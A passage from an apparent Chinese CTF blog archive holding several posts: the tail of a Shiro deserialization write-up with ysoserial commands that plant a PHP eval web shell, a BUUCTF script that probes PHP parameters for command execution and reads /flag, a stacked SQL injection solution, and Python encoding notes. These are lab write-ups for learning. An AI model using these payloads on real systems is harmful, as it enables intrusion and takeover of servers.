src="https://img-blog.csdnimg.cn/20210626015025253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626142410269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210626020227297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后有加号即存在漏洞</p><h4 id="提权shell"><a href="#提权shell" class="headerlink" title="提权shell"></a>提权shell</h4><p>生成payload然后用上述方法获取恶意rememberkey</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;touch /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;echo <span class="hljs-string">&quot;&lt;?php eval($_POST[&quot;</span>cmd<span class="hljs-string">&quot;]);&quot;</span> &gt; /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210626141447776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>重放之后进入1.php可看到内容</p><p><img src="https://img-blog.csdnimg.cn/20210626142151449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后用蚁剑连接即可，或者直接shrio工具反弹shell</p><p><img src="https://img-blog.csdnimg.cn/20210626144042750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626152005550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu上强网杯高明的黑客</title>
    <link href="/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <url>/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="buu上强网杯高明的黑客"><a href="#buu上强网杯高明的黑客" class="headerlink" title="buu上强网杯高明的黑客"></a>buu上强网杯高明的黑客</h2><p><img src="https://img-blog.csdnimg.cn/20210419233615169.png" alt="在这里插入图片描述"><br>入题就是直接给了一个压缩包下载下来之后会发现是超级多的php代码有点像日志，打开后浏览一下就会发现很多post get参数，还有内敛执行命令，猜测可以利用某个参数来进行命令执行，思路很简单，这题考的应该就是脚本能力。<br><img src="https://img-blog.csdnimg.cn/20210419233751848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码如下，写脚本过程挺难受，也试过多线程但最后总是一些数据连在一起，目前还没解决，最后拿了大佬的脚本跑也没跑出来，下面的脚本还是用的笨方法，回头再研究一下多线程的问题吧。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>s = requests.session()<br>rootdir = <span class="hljs-string">&#x27;D:\pythonwp\\buuweb\强网杯\src&#x27;</span><br>file_list = os.listdir(rootdir)<br>useful_param = []<br>flag = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">file</span>):</span><br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> useful_param<br>    <span class="hljs-comment"># print(&quot;try&quot;)</span><br>    re_GETpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,)<br>    re_POSTpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>)<br>    path = os.path.join(rootdir, file)<br>    <span class="hljs-comment"># print(path)</span><br>    url = <span class="hljs-string">&#x27;http://93dec788-f1ac-4f32-99e4-943960f2f002.node3.buuoj.cn/&#x27;</span> + file<br>    <span class="hljs-built_in">print</span>(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># print(f.read())</span><br>        res = f.read()<br>        GET_param = re.findall(re_GETpayload,res)<br>        POST_param = re.findall(re_POSTpayload,res)<br>    <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(GET_param)<br>        <span class="hljs-built_in">print</span>(POST_param)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(POST_param)):<br>        <span class="hljs-built_in">print</span>(POST_param[k])<br>        res_post = s.post(url=url, data=&#123;POST_param[k]: <span class="hljs-string">&#x27;echo hello&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_post.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(POST_param[k])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(GET_param)):<br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + GET_param[k] + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-string">&#x27;echo hello&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(data)</span><br>        res_get = s.get(url=payload)<br>        <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_get.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(GET_param[k])<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<span class="hljs-comment">#加入多线程</span><br>   <span class="hljs-comment"># t = threading.Thread(target=exp,args=(file_list[i],))</span><br>   <span class="hljs-comment"># t.start()</span><br>   exp(file_list[i])<br>   <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420003856335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>结果如上，可以发现可利用的php文件是xk0SzyKwfzw.php，参数为Efa5BVG，最后构造payload为Efa5BVG=cat /flag即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210420003924620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU一道关于注入的题</title>
    <link href="/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/"/>
    <url>/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="BUU一道关于注入的题"><a href="#BUU一道关于注入的题" class="headerlink" title="BUU一道关于注入的题"></a>BUU一道关于注入的题</h2><p>特点：不同于一般的注入题，这题则需要你猜测后端的查询语句<br>入题随便输个数字页面如图<img src="https://img-blog.csdnimg.cn/20210201194521105.png" alt="在这里插入图片描述"><br>输入字符时无回显，先尝试了下简单的几个语句<img src="https://img-blog.csdnimg.cn/20210201194631904.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210201194854948.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210201194913481.png" alt="在这里插入图片描述"><br>猜测某些关键字被过滤，尝试输union,if,and等等发现都显示 Nonono<br>最后试了下堆叠注入<img src="https://img-blog.csdnimg.cn/20210201195116950.png" alt="在这里插入图片描述"><br> 终于有反应了，继续尝试准备查看字段名仍然显示Nonono<br> 在这里挣扎了许久，最后没办法了只有乖乖去看大佬的wp，确实超出了自己的知识范围</p><h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。最终可推测出内置的sql语句为</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">sql</span>=“select”.post[‘query’].<span class="hljs-string">&quot;||flag from Flag&quot;</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>所以解法一：<br>如果$post[‘query’]的数据为*,1，sql语句就变成了</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span>||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>也就是</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>解法二：<br>输入</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">1;<span class="hljs-attribute">set_mode</span>=pips_as_concat;select 1<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201200415125.png" alt="在这里插入图片描述"><br>参考文章：<br><a href="https://blog.csdn.net/weixin_42373127/article/details/88866710">https://blog.csdn.net/weixin_42373127/article/details/88866710</a><br><a href="https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_44866139/article/details/105857487?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&amp;spm=1001.2101.3001.4242</a></p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习笔记1</title>
    <link href="/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/04/17/2021-4-17-python%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="python3中关于字节，字符串，进制，编码之间的总结区分"><a href="#python3中关于字节，字符串，进制，编码之间的总结区分" class="headerlink" title="python3中关于字节，字符串，进制，编码之间的总结区分"></a>python3中关于字节，字符串，进制，编码之间的总结区分</h1><p>最近学习ctf中的密码学会经常用到python但是对python中的进制转换，什么时候要用字节形式，什么时候要用到字符串形式以及进制和各种编码混在一起，这些分不太清楚做题时很浪费时间，所以来总结区分一下…</p><h3 id="首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面"><a href="#首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面" class="headerlink" title="首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面"></a>首先对于字节和字符串，两者形式上的区别在于字节形式上会有一个b，类似于下面</h3><p><img src="https://img-blog.csdnimg.cn/20210303210727212.png" alt="在这里插入图片描述"><br>两者也可以进行转换，如下图</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;hello world!&quot;</span><br>byte = <span class="hljs-built_in">str</span>.encode()   <span class="hljs-comment">#字符串转换为字节形式 &gt;&gt;b&quot;hello world!&quot;</span><br><span class="hljs-built_in">str</span> = byte.decode() <span class="hljs-comment">#字节形式转换为字符串</span><br><br></code></pre></div></td></tr></table></figure><h3 id="关于进制之间。"><a href="#关于进制之间。" class="headerlink" title="关于进制之间。"></a>关于进制之间。</h3><p>对于最基础的进制之间的转换，最常用的应当是python的几个内置函数，例如int()  ,   hex()   ,   bin()   ，oct()，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">int</span>(x,base)     <span class="hljs-comment">#第一个参数为所给数字或者字符串，第二个参数为进制数</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)   <span class="hljs-comment">#将所给字符串按照十六进制形式转化为十进制  结果为10</span><br><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0b100&#x27;</span>,<span class="hljs-number">2</span>)  <span class="hljs-comment">#按二进制转换为十进制  ，结果为4</span><br><span class="hljs-built_in">bin</span>(<span class="hljs-number">10</span>)         <span class="hljs-comment">#&gt;&gt;&#x27;0b1010&#x27;</span><br><span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span>)        <span class="hljs-comment">#&gt;&gt;&#x27;0xff&#x27;</span><br><span class="hljs-built_in">oct</span>(<span class="hljs-number">10</span>)  <span class="hljs-comment">#&gt;&gt;将十进制转换为八进制   结果为 &#x27;012&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="关于进制与字符串之间的转换"><a href="#关于进制与字符串之间的转换" class="headerlink" title="关于进制与字符串之间的转换"></a>关于进制与字符串之间的转换</h3><p>最常用的还是字符串十六进制的转换，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;hello&#x27;</span><br>ptint(str_to_hex(<span class="hljs-built_in">str</span>))         <span class="hljs-comment">#&gt;&gt;[&#x27;0x68&#x27;, &#x27;0x65&#x27;, &#x27;0x6c&#x27;, &#x27;0x6c&#x27;, &#x27;0x6f&#x27;]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.encode().<span class="hljs-built_in">hex</span>())      <span class="hljs-comment">#&gt;&gt;输出为&#x27;68656c6c6f&#x27;</span><br>hexstr = <span class="hljs-string">&#x27;68656c6c6f&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(hexstr))   <span class="hljs-comment">#输出为b&#x27;hello&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hex_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s]])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_bin</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><span class="hljs-built_in">print</span>(str_to_bin(<span class="hljs-built_in">str</span>))     <span class="hljs-comment">#&gt;&gt;&#x27;0b11010000b11001010b11011000b11011000b1101111&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-built_in">int</span>(b, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s.split(<span class="hljs-string">&#x27; &#x27;</span>)]])<br></code></pre></div></td></tr></table></figure><h3 id="关于字符串和编码之间"><a href="#关于字符串和编码之间" class="headerlink" title="关于字符串和编码之间"></a>关于字符串和编码之间</h3><p>最常用有关于ASCII转码的函数ord()chr()</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)   <span class="hljs-comment">#输出为97   转ASCII码</span><br><span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)    <span class="hljs-comment">#输出为&#x27;a&#x27;  ASCII转字符</span><br><span class="hljs-comment">#还可以用Crypto库</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-number">97</span>))    <span class="hljs-comment">#输出为字节型  b&#x27;a&#x27;  bytes_to_long同理</span><br>  <br></code></pre></div></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在python3之后字节与字符串以及各种编码之间已经划分的非常明确，如果对这些转换不是很明确在学习中会很浪费时间，所以再次解决这些困惑还是很有帮助的。</p><p><a href="https://blog.csdn.net/mxj588love/article/details/80692964?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477764216780262566198%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161477764216780262566198&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80692964.pc_search_result_hbase_insert&utm_term=python%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">参考文章1</a></p>]]></content>
    
    
    <categories>
      
      <category>python学习记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
